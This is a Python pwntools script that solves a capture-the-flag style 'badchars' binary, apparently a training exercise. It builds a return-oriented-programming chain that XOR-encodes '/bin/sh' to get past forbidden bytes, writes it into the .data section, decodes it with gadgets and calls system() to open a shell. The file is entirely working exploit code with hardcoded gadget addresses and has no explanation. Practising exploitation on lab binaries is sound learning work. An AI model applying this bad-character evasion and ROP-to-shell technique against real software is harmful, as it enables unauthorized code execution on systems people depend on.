#!/usr/bin/env python

from pwn import *

def encode(string, badchars):
    def xor(string, character):
        res = ""
        for c in string:
            res += chr(ord(c) ^ ord(character))
        return res

    for i in range(0, 256):
        ch = chr(i)
        if ch not in badchars:
            res = xor(string, ch)
            if not any([c in badchars for c in res]):
                return (res, ch)

    return None, None

p = process("./badchars")
p.recv(1024)

badchars = ["b", "i", "c", "/", "f", "n", "s", " "]
string = "/bin/sh\x00"
encoded, key = encode(string, badchars)

payload = (
    "\x90" * 40 +

    # write encoded
    p64(0x400b3b) + # pop r12 ; pop r13 ; ret
    encoded + # encoded /bin/sh
    p64(0x601074) + # .data
    p64(0x400b34) + # mov    QWORD PTR [r13+0x0],r12

    # decode
    p64(0x400b40) + # pop r14 ; pop r15 ; ret
    p64(ord(key)) + # key
    p64(0x601074) + # .data
    p64(0x400b30) + # xor    BYTE PTR [r15],r14b

    p64(0x400b42) + # pop r15 ; ret
    p64(0x601075) + # .data + 1
    p64(0x400b30) + # xor    BYTE PTR [r15],r14b

    p64(0x400b42) + # pop r15 ; ret
    p64(0x601076) + # .data + 2
    p64(0x400b30) + # xor    BYTE PTR [r15],r14b

    p64(0x400b42) + # pop r15 ; ret
    p64(0x601077) + # .data + 3
    p64(0x400b30) + # xor    BYTE PTR [r15],r14b

    p64(0x400b42) + # pop r15 ; ret
    p64(0x601078) + # .data + 4
    p64(0x400b30) + # xor    BYTE PTR [r15],r14b

    p64(0x400b42) + # pop r15 ; ret
    p64(0x601079) + # .data + 5
    p64(0x400b30) + # xor    BYTE PTR [r15],r14b

    p64(0x400b42) + # pop r15 ; ret
    p64(0x60107a) + # .data + 6
    p64(0x400b30) + # xor    BYTE PTR [r15],r14b

    p64(0x400b42) + # pop r15 ; ret
    p64(0x60107b) + # .data + 7
    p64(0x400b30) + # xor    BYTE PTR [r15],r14b

    p64(0x400b39) + # pop rdi ; ret
    p64(0x601074) + # .data /bin/sh
    p64(0x4006f0) # system@plt
)

p.sendline(payload)
p.interactive()

p.close()
